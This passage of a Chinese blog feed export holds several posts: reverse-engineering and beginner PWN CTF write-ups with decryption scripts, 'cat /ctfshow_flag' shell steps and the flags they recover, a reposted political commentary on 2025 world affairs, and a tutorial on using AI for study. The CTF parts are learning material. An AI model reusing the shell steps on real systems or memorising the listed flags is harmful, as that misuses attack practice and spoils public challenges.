Needham于1994年提出，其核心特点是结构简单（仅需20行代码）、效率高（基于Feistel网络结构），适用于资源受限的环境。它通过多轮（通常32轮）的位运算（加法、异或、移位）和密钥混合（128位密钥分为4个32位子密钥）对64位数据块进行加密，每轮操作包含对明文的非线性变换和密钥的轮换使用，虽然安全性曾受限于密钥相关攻击，但改进版XTEA和XXTEA修复了这些弱点，至今仍广泛应用于嵌入式系统和网络协议中。</p></blockquote><p>进入 sub_140011B60 函数，得到加密后的数据，写解题脚本</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key = [<span class="number">2233</span>, <span class="number">4455</span>, <span class="number">6677</span>, <span class="number">8899</span>]</span><br><span class="line"></span><br><span class="line">    value = [</span><br><span class="line">        <span class="number">0x1A800BDA</span>,</span><br><span class="line">        <span class="number">0xF7A6219B</span>,</span><br><span class="line">        <span class="number">0x491811D8</span>,</span><br><span class="line">        <span class="number">0xF2013328</span>,</span><br><span class="line">        <span class="number">0x156C365B</span>,</span><br><span class="line">        <span class="number">0x3C6EAAD8</span>,</span><br><span class="line">        <span class="number">0x84D4BF28</span>,</span><br><span class="line">        <span class="number">0xF11A7EE7</span>,</span><br><span class="line">        <span class="number">0x3313B252</span>,</span><br><span class="line">        <span class="number">0xDD9FE279</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    dalte = <span class="number">0x0F462900</span>  <span class="comment"># 注意这里 C 代码是 0xF462900</span></span><br><span class="line">    <span class="comment"># Python 无符号溢出需要手动限制 32 位</span></span><br><span class="line">    MASK32 = <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, -<span class="number">1</span>, -<span class="number">1</span>):  <span class="comment"># i 从 8 到 0</span></span><br><span class="line">        wheel = <span class="number">33</span></span><br><span class="line">        sum_val = (dalte * (i + wheel)) &amp; MASK32</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> wheel &gt; <span class="number">0</span>:</span><br><span class="line">            wheel -= <span class="number">1</span></span><br><span class="line">            sum_val = (sum_val - dalte) &amp; MASK32</span><br><span class="line"></span><br><span class="line">            value[i + <span class="number">1</span>] = (value[i + <span class="number">1</span>] - ((sum_val + key[(sum_val &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^</span><br><span class="line">                              (value[i] + ((value[i] &gt;&gt; <span class="number">5</span>) ^ ((value[i] &lt;&lt; <span class="number">4</span>) &amp; MASK32))))) &amp; MASK32</span><br><span class="line"></span><br><span class="line">            value[i] = (value[i] - (sum_val ^ (value[i + <span class="number">1</span>] + ((value[i + <span class="number">1</span>] &gt;&gt; <span class="number">5</span>) ^</span><br><span class="line">                              ((value[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; MASK32))) ^</span><br><span class="line">                              (sum_val + key[sum_val &amp; <span class="number">3</span>]))) &amp; MASK32</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> value:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"<span class="subst">{v:08x}</span>"</span>, end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><p>485a4354467b687a4374665f39345f726536363666696e6763727935363431710000717d00000000</p></blockquote><p>![截屏2025-08-10 17.51.22](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 17.51.22.png)</p><hr><h2 id="40-GXYCTF-2019-luck-guy"><a href="#40-GXYCTF-2019-luck-guy" class="headerlink" title="40 [GXYCTF 2019]luck_guy"></a>40 [GXYCTF 2019]luck_guy</h2><p>🚩flag：<code>NSSCTF{do_not_hate_me}</code></p><p>💡hint：</p><p>elf文件，ida pro 反编译。</p><p>核心代码为</p><p>![截屏2025-08-10 17.57.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 17.57.48.png)</p><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">flag = <span class="string">''</span></span><br><span class="line">f2 = [<span class="number">0x7F</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>]  <span class="comment"># 反转数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(f2[i] - <span class="number">2</span>)  <span class="comment"># 奇数索引减2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(f2[i] - <span class="number">1</span>)  <span class="comment"># 偶数索引减1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>hate_me}</p></blockquote><p>加上前缀信息：GXY{do_not_hate_me}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2025年国际热点观察</title>
      <link href="/2026/01/30/2025%E5%B9%B4%E5%9B%BD%E9%99%85%E7%83%AD%E7%82%B9%E8%A7%82%E5%AF%9F/"/>
      <url>/2026/01/30/2025%E5%B9%B4%E5%9B%BD%E9%99%85%E7%83%AD%E7%82%B9%E8%A7%82%E5%AF%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="原文出处与整理说明"><a href="#原文出处与整理说明" class="headerlink" title="原文出处与整理说明"></a>原文出处与整理说明</h2><p><strong>原文标题</strong>：2025年国际热点观察<br><strong>文章来源</strong>：《红旗文稿》2026 / 2<br><strong>原文作者</strong>：中国现代国际关系研究院课题组<br><strong>原文发布时间</strong>：2026-01-29</p><p><strong>整理说明</strong>：<br>本文内容整理自《红旗文稿》刊发文章。为便于个人学习、阅读与长期归档，现将原文内容<strong>在不改变原意、不删减内容的前提下</strong>，转换为博客文章格式，仅对段落结构和标题层级进行整理。</p><hr><p>2025年，国际局势呈现变乱交织、动荡加剧的核心特征，“美国优先”政策持续冲击国际秩序，国际力量对比深刻调整，地缘冲突热度不减，全球和平、发展、安全、治理赤字有增无减。中国在复杂国际环境中保持战略定力，担当起推动世界多极化和国际关系民主化的中流砥柱，为动荡不安的世界注入了更多稳定性和确定性。</p><p>深入分析当前国际热点问题，对于我们深化对百年未有之大变局的认识，正确把握历史大势，在应对国际风云变幻和各种风险挑战中坚定不移办好自己的事，具有重要意义。</p><hr><h2 id="一、中国元首外交推动和平与发展事业"><a href="#一、中国元首外交推动和平与发展事业" class="headerlink" title="一、中国元首外交推动和平与发展事业"></a>一、中国元首外交推动和平与发展事业</h2><p>2025年，世界百年变局加速演进，冷战思维与单边主义阴霾不散，全球发展赤字与安全挑战交织叠加。在此关键节点，中国元首外交以远见卓识和务实行动，为动荡变革的世界注入稳定力量，为人类和平与发展事业擘画前行路径，书写了大国担当的崭新篇章。</p><p>大国关系是世界和平的“压舱石”。2025年，中国元首外交坚持对话协商，推动大国关系均衡发展。中俄元首多次会晤，引领两国关系成为世界最稳定、最成熟的大国关系，共同维护全球战略稳定与国际法权威。中美元首时隔6年再度会晤，超百分钟的深入沟通为两国关系校准航向，彰显“做伙伴、做朋友”的历史必然。</p><p>与法国总统漫步都江堰、同欧洲多国领导人深化共识，中国元首外交推动中欧发出多边主义与开放合作的共同声音。</p><p>发展是解决一切问题的总钥匙。2025年，中国元首外交聚焦周边与发展中国家，以互利合作破解发展难题。从东南亚之行推动中越、中马命运共同体建设，到中亚之旅签署《永久睦邻友好合作条约》，再到韩国之行深化战略伙伴关系，周边外交在互动中织密友谊与合作网络。</p><p>中国始终坚持大小国家一律平等，会见格林纳达等发展中国家领导人，倾听全球南方声音，推动合作成果惠及各国人民。一年来，数十场双边会晤密集开展，一系列合作共识转化为务实项目，中国元首外交让发展成果更多更公平地惠及各国人民。</p><p>2025年的中国元首外交，以理念引领方向，以对话化解分歧，以合作促进发展。在构建人类命运共同体的征程中，中国将继续通过元首外交凝聚共识、汇聚力量，与世界各国携手应对风险挑战，共同创造和平发展、互利共赢的美好未来。</p><hr><h2 id="二、美国国家战略转向加剧全球局势不稳定性"><a href="#二、美国国家战略转向加剧全球局势不稳定性" class="headerlink" title="二、美国国家战略转向加剧全球局势不稳定性"></a>二、美国国家战略转向加剧全球局势不稳定性</h2><p>2025年，美国政府激进推行“美国优先”议程，企图重振美国实力地位。</p><h3 id="（一）对内政策"><a href="#（一）对内政策" class="headerlink" title="（一）对内政策"></a>（一）对内政策</h3><p>对内，“特朗普革命”意图夯实霸权根基，授权“政府效率部”大肆整改联邦政府，大规模驱逐非法移民，力推国会通过《“大而美”法案》《天才法案》等重磅立法；采取“技术加速主义”路线，通过减少监管、加速投资，加紧布局科技竞争；能源与环境政策“猛掉头”，废除拜登政府“绿色新政”，重新拥抱化石能源，意图以强化能源主导权保障美国经济与地缘优势。</p><h3 id="（二）对外政策"><a href="#（二）对外政策" class="headerlink" title="（二）对外政策"></a>（二）对外政策</h3><p>对外，大搞“交易外交”，以单边方式服务“美国至上”。经济领域，发动历史性全球关税战，力度空前、手段激进；外交领域，一面全力遏制中国，一面肆意霸凌盟友，毫不顾忌欧洲利益与看法。</p><p>美国政府还拒绝承担国际责任，宣布退出《巴黎协定》、世卫组织等重要协定或机构，并表示将退出66个“不再服务于美国利益”的国际组织。新版《国家安全战略》强调美中“经济再平衡”和美国在西半球利益。</p><p>美国政府追求“以实力求和平”，破坏性极大，严重损害国家间互信，扰乱全球经济秩序，加剧全球安全困境。</p><hr><h2 id="三、美欧关系呈现复杂化态势"><a href="#三、美欧关系呈现复杂化态势" class="headerlink" title="三、美欧关系呈现复杂化态势"></a>三、美欧关系呈现复杂化态势</h2><p>2025年，美欧关系遭受特朗普二任的巨大冲击，双方矛盾不断加深。</p><p>在俄乌冲突中，美国与俄罗斯越过欧洲开展“越顶外交”，引发欧洲和乌克兰强烈反弹；特朗普还公开威胁“不排除用武力夺取格陵兰岛”。</p><p>在经贸领域，美国强迫欧洲接受一系列“不对等条款”，并强力施压欧盟撤销绿色和数字监管措施。新版《国家安全战略》甚至宣称欧洲将面临“文明消亡”。</p><p>安全、经济与价值观三大支柱同步松动，美欧关系正在加速分裂，裂痕公开化、激烈化趋势明显。</p><hr><h2 id="四、俄乌和平谈判核心议题分歧依旧难解"><a href="#四、俄乌和平谈判核心议题分歧依旧难解" class="headerlink" title="四、俄乌和平谈判核心议题分歧依旧难解"></a>四、俄乌和平谈判核心议题分歧依旧难解</h2><p>2025年是俄乌冲突第四个年头。双方消耗战态势持续，远程互袭日趋激烈。</p><p>特朗普政府提出28点和平计划，但在领土、安全与核电站归属等问题上分歧严重。美、欧、俄、乌各方方案分歧明显，停火条件立场对立。</p><p>由于核心诉求难以调和，俄乌和平谈判前景依旧复杂艰难。对话谈判仍是唯一可行途径。</p><hr><h2 id="五、中东战火损失惨重，未来前景堪忧"><a href="#五、中东战火损失惨重，未来前景堪忧" class="headerlink" title="五、中东战火损失惨重，未来前景堪忧"></a>五、中东战火损失惨重，未来前景堪忧</h2><p>2025年，中东安全局势持续动荡，伊朗长期经营的“抵抗阵线”遭到重创。</p><p>“12日战争”后，伊朗战略威慑力严重削弱，中东进入旧秩序瓦解、新秩序尚未成形的过渡阶段。以色列强势扩张，土耳其和海湾国家加快调整地区战略。</p><p>中东正处于新旧矛盾叠加的高风险时期，未来不确定性明显增加。</p><hr><h2 id="六、全球金融市场动荡加剧经济风险"><a href="#六、全球金融市场动荡加剧经济风险" class="headerlink" title="六、全球金融市场动荡加剧经济风险"></a>六、全球金融市场动荡加剧经济风险</h2><p>2025年，美国“关税战”与地缘政治风险叠加，全球金融市场剧烈波动。</p><p>美元信用受损，美股估值承压，全球“去美元化”趋势加速。黄金、白银价格大幅上涨，加密货币波动剧烈。</p><p>国际金融体系进入结构调整期，风险上升，多极化趋势更加明显。</p><hr><h2 id="七、人工智能发展格局调整呼吁加强国际合作"><a href="#七、人工智能发展格局调整呼吁加强国际合作" class="headerlink" title="七、人工智能发展格局调整呼吁加强国际合作"></a>七、人工智能发展格局调整呼吁加强国际合作</h2><p>2025年，中美人工智能技术差距迅速缩小。中国以 DeepSeek、昇腾等为代表的国产模型强势突围，开源模型全球影响力持续扩大。</p><p>中国人工智能以低门槛、可本地化部署等优势，推动全球人工智能普惠发展。科技进步需要开放合作，全球治理亟需协调统一。</p><hr><h2 id="八、以历史正义捍卫二战胜利成果"><a href="#八、以历史正义捍卫二战胜利成果" class="headerlink" title="八、以历史正义捍卫二战胜利成果"></a>八、以历史正义捍卫二战胜利成果</h2><p>2025年是中国人民抗日战争暨世界反法西斯战争胜利80周年，也是联合国成立80周年。</p><p>中国通过一系列重大纪念活动，弘扬正确历史观，捍卫二战胜利成果，维护以联合国为核心的国际体系。</p><p>历史不容篡改，世界不应重回“强权即公理”的丛林法则。</p><hr><h2 id="九、日本高市早苗政权挑战战后国际秩序引发国际社会高度警惕"><a href="#九、日本高市早苗政权挑战战后国际秩序引发国际社会高度警惕" class="headerlink" title="九、日本高市早苗政权挑战战后国际秩序引发国际社会高度警惕"></a>九、日本高市早苗政权挑战战后国际秩序引发国际社会高度警惕</h2><p>2025年10月，高市早苗出任日本首相后，推行扩军备武、干涉台湾问题、否认侵略历史等一系列危险举措。</p><p>其行为严重挑战战后国际秩序，破坏中日政治基础，威胁地区和平稳定，遭到国际社会广泛警惕和反对。</p><hr><h2 id="十、全球治理倡议回应时代挑战"><a href="#十、全球治理倡议回应时代挑战" class="headerlink" title="十、全球治理倡议回应时代挑战"></a>十、全球治理倡议回应时代挑战</h2><p>2025年9月1日，习近平总书记在“上海合作组织+”会议上首次提出全球治理倡议。</p><p>该倡议与全球发展、安全、文明倡议相辅相成，为改革完善全球治理体系提供中国方案。倡议一经提出即获国际社会广泛响应。</p><p>未来，中国将继续推动构建更加公正、合理、有效的全球治理体系。</p>]]></content>
      
      
      <categories>
          
          <category> 时政学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ai使用教程</title>
      <link href="/2026/01/30/ai%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2026/01/30/ai%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一切皆可-AI：我的-AI-使用技巧与大学学习实践心得"><a href="#一切皆可-AI：我的-AI-使用技巧与大学学习实践心得" class="headerlink" title="一切皆可 AI：我的 AI 使用技巧与大学学习实践心得"></a>一切皆可 AI：我的 AI 使用技巧与大学学习实践心得</h1><blockquote><p>在很长一段时间里，我一直把 AI 当成“有问题才用的工具”。<br>后来我发现，其实换一个视角——<strong>一切皆可 AI</strong>，很多事情都会变得更轻松。</p></blockquote><p>这篇文章主要记录我在<strong>学习、做项目以及日常思考中使用 AI 的一些观念转变和实践经验</strong>，尤其是对大学阶段的同学来说，AI 不只是“写作业神器”，而是一个可以长期共处的「第二大脑」。</p><hr><h2 id="一、观念转变：从「用-AI」到「和-AI-一起想」"><a href="#一、观念转变：从「用-AI」到「和-AI-一起想」" class="headerlink" title="一、观念转变：从「用 AI」到「和 AI 一起想」"></a>一、观念转变：从「用 AI」到「和 AI 一起想」</h2><p>很多人使用 AI 的方式是这样的：</p><ul><li>作业不会 → 问 AI</li><li>报错了 → 贴给 AI</li><li>实在没思路 → 让 AI 给方案</li></ul><p>但我后来慢慢意识到一个变化：</p><blockquote><p><strong>AI 不应该只在“卡住”的时候出现，而是从一开始就参与。</strong></p></blockquote><h3 id="一切皆可-AI，意味着什么？"><a href="#一切皆可-AI，意味着什么？" class="headerlink" title="一切皆可 AI，意味着什么？"></a>一切皆可 AI，意味着什么？</h3><ul><li>有问题，不要攒着</li><li>有想法，不用等成熟</li><li>有困惑，不必先想清楚</li></ul><p>👉 <strong>第一时间丢给 AI</strong></p><p>哪怕你的问题是模糊的、零碎的、不成体系的，也完全没关系。</p><p>比如：</p><ul><li>“我感觉这门课学得很乱，但又说不清哪里有问题”</li><li>“我想做个项目，但好像什么都想做一点”</li><li>“这个知识点我好像懂了，又好像没懂”</li></ul><p>这些<strong>本来就很难自己整理的问题</strong>，反而非常适合和 AI 对话。</p><hr><h2 id="二、AI-在大学学习中的实际作用"><a href="#二、AI-在大学学习中的实际作用" class="headerlink" title="二、AI 在大学学习中的实际作用"></a>二、AI 在大学学习中的实际作用</h2><h3 id="1️⃣-学新知识：让-AI-当“私人助教”"><a href="#1️⃣-学新知识：让-AI-当“私人助教”" class="headerlink" title="1️⃣ 学新知识：让 AI 当“私人助教”"></a>1️⃣ 学新知识：让 AI 当“私人助教”</h3><p>在大学里，我们经常遇到的问题不是「学不会」，而是：</p><ul><li>不知道重点在哪</li><li>不知道该怎么开始</li><li>不知道这门课在干嘛</li></ul><p>这时可以直接对 AI 说：</p><blockquote><p>“我是一名大一 / 大二学生，现在在学 XXX，你能用通俗但不敷衍的方式帮我梳理这门课的知识结构吗？”</p></blockquote><p>你可以让 AI：</p><ul><li>用 <strong>类比</strong> 解释抽象概念</li><li>把一章内容拆成「你现在只需要懂的 20%」</li><li>对比「考试视角」和「实际应用视角」</li></ul><p>AI 很适合做<strong>第一遍理解</strong>，而不是替你记忆。</p><hr><h3 id="2️⃣-写作业-写论文：不是代写，而是“拆解任务”"><a href="#2️⃣-写作业-写论文：不是代写，而是“拆解任务”" class="headerlink" title="2️⃣ 写作业 / 写论文：不是代写，而是“拆解任务”"></a>2️⃣ 写作业 / 写论文：不是代写，而是“拆解任务”</h3><p>与其直接说「帮我写作业」，不如这样用：</p><ul><li>让 AI <strong>拆解作业要求</strong></li><li>帮你判断老师真正想考什么</li><li>给一个<strong>结构框架</strong>，而不是完整答案</li></ul><p>例如：</p><blockquote><p>“这是我的课程作业要求，你先不要给答案，只帮我分析：这道题主要考什么能力？”</p></blockquote><p>这一步能极大减少「写了半天，方向全错」的情况。</p><hr><h3 id="3️⃣-复习与总结：让-AI-帮你“压缩知识”"><a href="#3️⃣-复习与总结：让-AI-帮你“压缩知识”" class="headerlink" title="3️⃣ 复习与总结：让 AI 帮你“压缩知识”"></a>3️⃣ 复习与总结：让 AI 帮你“压缩知识”</h3><p>AI 非常擅长做三件事：</p><ul><li>总结</li><li>对比</li><li>抽象</li></ul><p>你可以把自己的笔记、PPT、甚至零散想法丢给 AI，让它帮你：</p><ul><li>总结成 <strong>考试前速览版</strong></li><li>列出 <strong>容易混淆的点</strong></li><li>用问答的方式帮你自测</li></ul><hr><h2 id="三、做项目时，我是怎么用-AI-的"><a href="#三、做项目时，我是怎么用-AI-的" class="headerlink" title="三、做项目时，我是怎么用 AI 的"></a>三、做项目时，我是怎么用 AI 的</h2><h3 id="1️⃣-有想法-→-先和-AI-讨论"><a href="#1️⃣-有想法-→-先和-AI-讨论" class="headerlink" title="1️⃣ 有想法 → 先和 AI 讨论"></a>1️⃣ 有想法 → 先和 AI 讨论</h3><p>以前我经常卡在一个阶段：</p><blockquote><p>“我有个想法，但不确定值不值得做。”</p></blockquote><p>现在我的第一反应是：</p><blockquote><p>“我有一个不成熟的想法，我直接说，你帮我判断可行性。”</p></blockquote><p>你可以让 AI 扮演不同角色：</p><ul><li>产品经理</li><li>技术负责人</li><li>普通用户</li></ul><p>从不同视角帮你<strong>打碎和重组想法</strong>。</p><hr><h3 id="2️⃣-逐步明确，而不是一次到位"><a href="#2️⃣-逐步明确，而不是一次到位" class="headerlink" title="2️⃣ 逐步明确，而不是一次到位"></a>2️⃣ 逐步明确，而不是一次到位</h3><p>和 AI 讨论项目时，我一般是这样一个流程：</p><ol><li>丢一个很模糊的想法</li><li>让 AI 帮我拆成模块</li><li>针对其中一个模块深入</li><li>确定最小可行版本（MVP）</li><li>再开始真正写代码</li></ol><p>👉 <strong>AI 非常适合陪你“慢慢想清楚”</strong></p><hr><h3 id="3️⃣-执行阶段：让-AI-成为随叫随到的搭子"><a href="#3️⃣-执行阶段：让-AI-成为随叫随到的搭子" class="headerlink" title="3️⃣ 执行阶段：让 AI 成为随叫随到的搭子"></a>3️⃣ 执行阶段：让 AI 成为随叫随到的搭子</h3><p>在真正开始做项目后，AI 可以：</p><ul><li>解释报错，而不是只给修复方案</li><li>帮你评估不同实现方式的取舍</li><li>帮你检查“这个功能是不是做复杂了”</li></ul><p>你可以随时中断思考，把当前状态发给 AI：</p><blockquote><p>“我现在做到这一步了，但感觉有点乱，你帮我理一下下一步优先级。”</p></blockquote><hr><h2 id="四、非常实用的-AI-使用技巧"><a href="#四、非常实用的-AI-使用技巧" class="headerlink" title="四、非常实用的 AI 使用技巧"></a>四、非常实用的 AI 使用技巧</h2><h3 id="✅-技巧-1：对话太长？让-AI-帮你“生成-Prompt”"><a href="#✅-技巧-1：对话太长？让-AI-帮你“生成-Prompt”" class="headerlink" title="✅ 技巧 1：对话太长？让 AI 帮你“生成 Prompt”"></a>✅ 技巧 1：对话太长？让 AI 帮你“生成 Prompt”</h3><p>这是我<strong>用得最多的技巧之一</strong>。</p><p>当对话变得很长、信息很多时，可以直接说：</p><blockquote><p>“请你总结一下我们目前的讨论，并帮我生成一个新的 prompt，用于开启下一轮对话。”</p></blockquote><p>这样你可以：</p><ul><li>清空上下文</li><li>保留核心目标</li><li>避免 AI 因为上下文过长而跑偏</li></ul><hr><h3 id="✅-技巧-2：不要等问题“想清楚”再问"><a href="#✅-技巧-2：不要等问题“想清楚”再问" class="headerlink" title="✅ 技巧 2：不要等问题“想清楚”再问"></a>✅ 技巧 2：不要等问题“想清楚”再问</h3><p>这是一个非常重要的心态转变：</p><blockquote><p><strong>问题不是想清楚了才问 AI，而是问 AI 的过程中想清楚。</strong></p></blockquote><p>哪怕你现在只知道：</p><ul><li>“我好像哪里不太对劲”</li><li>“我感觉这个方向有点怪”</li></ul><p>都可以直接说出来。</p><hr><h3 id="✅-技巧-3：把-AI-当成“会反问你的对象”"><a href="#✅-技巧-3：把-AI-当成“会反问你的对象”" class="headerlink" title="✅ 技巧 3：把 AI 当成“会反问你的对象”"></a>✅ 技巧 3：把 AI 当成“会反问你的对象”</h3><p>你可以主动要求 AI：</p><ul><li>多问你问题</li><li>挑你方案的毛病</li><li>假装不同意你的想法</li></ul><p>例如：</p><blockquote><p>“你现在站在反对者的角度，尽可能否定我的方案。”</p></blockquote><p>这对思考质量的提升非常明显。</p><hr><h2 id="五、写在最后：AI-不是替你思考，而是放大你"><a href="#五、写在最后：AI-不是替你思考，而是放大你" class="headerlink" title="五、写在最后：AI 不是替你思考，而是放大你"></a>五、写在最后：AI 不是替你思考，而是放大你</h2><p>我越来越觉得，AI 的真正价值不是：</p><ul><li>帮你少想</li><li>帮你偷懒</li></ul><p>而是：</p><blockquote><p><strong>帮你更早开始思考，更久地保持思考。</strong></p></blockquote><p>如果你愿意把 AI 当成一个长期协作的对象，而不是“救急工具”，你会发现：</p><ul><li>学习变得没那么痛苦</li><li>项目不再那么容易烂尾</li><li>自己的想法会越来越清晰</li></ul><p><strong>一切皆可 AI，但前提是——你愿意把自己也放进思考里。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PWN暑期刷题记录</title>
      <link href="/2026/01/30/CTFshowPWN%E7%BB%83%E4%B9%A0/"/>
      <url>/2026/01/30/CTFshowPWN%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>放一波暑假的刷题记录<br>以下题目来源：ctfshow pwn入门</p><p>☁️ ✴︎📩 🩹</p><blockquote><p> Test_your_nc 01~05</p></blockquote><h2 id="01-pwn0"><a href="#01-pwn0" class="headerlink" title="01 pwn0"></a>01 pwn0</h2><p>🚩flag：<code>ctfshow{f3fb4340-bbae-4ef1-ac35-e7668329b410}</code></p><p>💡hint：<code>签到</code></p><p>题目描述：用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</p><p><a href="https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ">专用虚拟机镜像，全套在这里，提取码show</a></p><p>虚拟机镜像 用户名为ctfshow 密码是ctfshow</p><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 13.36.26.png" alt="截屏2025-08-11 13.36.26" style="zoom:50%;"><p>给了一个shell。</p><p>获取flag：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">cat</span> /ctfshow_flag</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="02-pwn1"><a href="#02-pwn1" class="headerlink" title="02 pwn1"></a>02 pwn1</h2><p>🚩flag：<code>ctfshow{4dd710b0-23c0-4a5e-bcb8-909ec3aa4e81}</code></p><p>💡hint：<code>基础分析</code></p><p>使用<code>nc pwn.challenge.ctf.show 28107</code>连接上靶机，即可拿到flag。</p><p>程序直接执行了后门函数</p><hr><h2 id="03-pwn2"><a href="#03-pwn2" class="headerlink" title="03 pwn2"></a>03 pwn2</h2><p>🚩flag：<code>ctfshow{5c2dc31f-35e8-4df8-ba49-155c8529e01b}</code></p><p>💡hint：<code>基础分析</code></p><p>题目描述：给你一个shell，这次需要你自己去获得flag</p><p>环境中提示用户手动执行后门函数获得flag。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /ctfshow_flag</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="04-pwn03"><a href="#04-pwn03" class="headerlink" title="04 pwn03"></a>04 pwn03</h2><p>🚩flag：<code>ctfshow{d0593e57-6c08-4666-b6f3-d35718fb6f59}</code></p><p>💡hint：<code>基础分析</code></p><p>题目描述：哪一个函数才能读取flag？</p><p>![截屏2025-08-11 13.49.26](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 13.49.26.png)</p><ul><li><code>system()</code> 是 Linux 系统调用，可以直接执行 shell 命令。</li><li><code>cat /ctfshow_flag</code> 会读取 <code>/ctfshow_flag</code> 文件的内容并输出到终端。</li></ul><hr><h2 id="05-pwn4"><a href="#05-pwn4" class="headerlink" title="05 pwn4"></a>05 pwn4</h2><p>🚩flag：<code>ctfshow{0b4bf2e8-ec76-480f-8ffb-453184a07ea9}</code></p><p>💡hint：<code>反编译 </code> <code>自动化路径求解</code></p><p>题目描述：或许需要先得到某个神秘字符</p><p>![截屏2025-08-11 13.53.15](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 13.53.15.png)</p><p>现在需要按照规范的流程来分析。</p><p>先checksec：</p><blockquote><p><strong><code>checksec</code></strong> 是一个用于检查二进制文件安全防护机制的工具，它能快速分析 ELF 可执行文件或共享库的安全属性，包括：</p><ul><li><strong>NX（堆栈不可执行）</strong>：防止 shellcode 在栈上运行；</li><li><strong>PIE（地址随机化）</strong>：使代码段加载地址随机化，增加漏洞利用难度；</li><li><strong>RELRO（重定位只读）</strong>：保护 GOT 表不被篡改（Full RELRO 最安全）；</li><li><strong>Canary（栈保护）</strong>：检测栈溢出攻击；</li><li><strong>Fortify</strong>：对危险函数（如 <code>strcpy</code>）进行编译时加固。<br>运行 <code>checksec --file=程序名</code> 即可查看防护状态，帮助评估漏洞利用的可行性。</li></ul></blockquote><p>![截屏2025-08-11 14.15.31](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.15.31.png)</p><p>可以看到是64位保护全开。</p><p>使用ida进行查看</p><p>![截屏2025-08-11 14.16.46](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.16.46.png)</p><p>大致流程如下：</p><p>首先将字符串 “CTFshowPWN” 复制到 s1 变量中。</p><p>接着，使用 puts 函数输出字符串 “find the secret !”。</p><p>紧接着，通过 __isoc99_scanf 函数从用户输入中读取一个字符串到 s2 变量中。</p><p>最后，通过 strcmp 函数比较 s1 和 s2 的内容是否相同。如果相同，则调用 execve_func 函 数。</p><p>跟进execve_func()：</p><p>![截屏2025-08-11 14.18.12](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.18.12.png)</p><p>可以看到将字符串 “/bin/sh” 赋值给  argv 变量。</p><p>然后，将 v2 和 v3 初始化为 0。</p><p>通过调用 execve 系统调用来执行 /bin/sh shell。</p><p>因此这里的execve_func也就是我们所谓的一个后门函数了</p><p>所以根据主函数，我们需要输入的字符是：</p><blockquote><p>CTFshowPWN</p></blockquote><p>然后按照常规流程来获取flag即可。</p><p>![截屏2025-08-11 14.23.39](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.23.39.png)</p><hr><blockquote><p>06~35为前置基础系列</p></blockquote><h2 id="06-pwn5"><a href="#06-pwn5" class="headerlink" title="06 pwn5"></a>06 pwn5</h2><p>🚩flag：<code>ctfshow{0b4bf2e8-ec76-480f-8ffb-453184a07ea9}</code></p><p>💡hint：<code>计组原理</code></p><p>题目描述：运行此文件，将得到的字符串以ctfshow{xxxxx}提交。</p><p>如：运行文件后 输出的内容为 Hello_World</p><p>提交的flag值为：ctfshow{Hello_World}</p><p>注意添加可执行权限：</p><p>![截屏2025-08-11 14.42.42](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.42.42.png)</p><p>添加外壳之后是ctfshow{Welcome_to_CTFshow_PWN}</p><hr><h2 id="07-pwn6"><a 